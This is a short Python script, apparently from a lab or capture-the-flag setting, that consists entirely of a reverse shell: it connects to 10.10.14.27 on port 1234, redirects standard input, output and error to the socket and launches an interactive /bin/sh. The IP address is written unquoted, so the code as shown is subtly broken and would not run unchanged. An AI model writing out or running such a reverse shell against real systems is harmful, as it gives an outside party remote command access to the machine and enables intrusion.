import socket,subprocess,os


ip_nc = 10.10.14.27
port_nc = int(1234)
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((ip_nc,port_nc))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
